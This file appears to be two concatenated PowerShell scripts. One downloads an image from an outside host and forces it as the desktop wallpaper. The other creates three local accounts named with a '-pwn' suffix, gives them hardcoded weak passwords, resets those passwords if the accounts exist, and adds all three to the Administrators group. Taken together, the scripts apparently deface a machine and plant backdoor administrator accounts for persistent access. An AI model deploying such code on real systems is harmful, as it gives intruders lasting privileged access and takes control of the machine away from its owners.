# set-stretch-wallpaper.ps1
Param()

$picUrl  = "https://i.ibb.co/93nW3z37/IMG-5247-min.jpg"
$picPath = Join-Path $env:TEMP "public_pic.jpg"

# download (simple)
try {
    Invoke-WebRequest -Uri $picUrl -OutFile $picPath -ErrorAction Stop
} catch {
    Write-Error "Download failed: $($_.Exception.Message)"; exit 1
}

# set registry to Stretch
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "2"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper   -Value "0"

# add P/Invoke and apply
$cs = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@
Add-Type -TypeDefinition $cs

# SPI_SETDESKWALLPAPER = 20, SPIF_UPDATEINIFILE (1) + SPIF_SENDCHANGE (2) = 3
$result = [Wallpaper]::SystemParametersInfo(20, 0, $picPath, 3)
if ($result -eq 0) { Write-Error "Failed to set wallpaper." } else { Write-Host "Wallpaper set and stretched: $picPath" }



# --- add-users.ps1 ---
# Run this script as Administrator

# Define users as a list of hashtables
$users = @(
    @{ Username = 'sergio-pwn'; FullName = 'Sergio Y'; Password = 'P@ssw0rd1' },
    @{ Username = 'doug-pwn';   FullName = 'Doug M';   Password = 'P@ssw0rd2' },
    @{ Username = 'ian-pwn';    FullName = 'Ian H';    Password = 'P@ssw0rd3' }
)

foreach ($u in $users) {
    Write-Host "Processing $($u.Username)..." -ForegroundColor Cyan

    try {
        $secPass = ConvertTo-SecureString $u.Password -AsPlainText -Force
        $existing = Get-LocalUser -Name $u.Username -ErrorAction SilentlyContinue

        if ($existing) {
            Write-Host "User $($u.Username) already exists. Updating password..." -ForegroundColor Yellow
            Set-LocalUser -Name $u.Username -Password $secPass
        } else {
            Write-Host "Creating user $($u.Username)..." -ForegroundColor Green
            New-LocalUser -Name $u.Username -FullName $u.FullName -Password $secPass -Description ""
        }

        # Add to Administrators group if not already
        if (-not (Get-LocalGroupMember -Group Administrators -Member $u.Username -ErrorAction SilentlyContinue)) {
            Add-LocalGroupMember -Group Administrators -Member $u.Username
            Write-Host "Added $($u.Username) to Administrators group."
        } else {
            Write-Host "$($u.Username) is already in Administrators group."
        }

    } catch {
        Write-Host "Error processing $($u.Username): $_" -ForegroundColor Red
    }

    Write-Host ""
}

Write-Host "All done!" -ForegroundColor Magenta

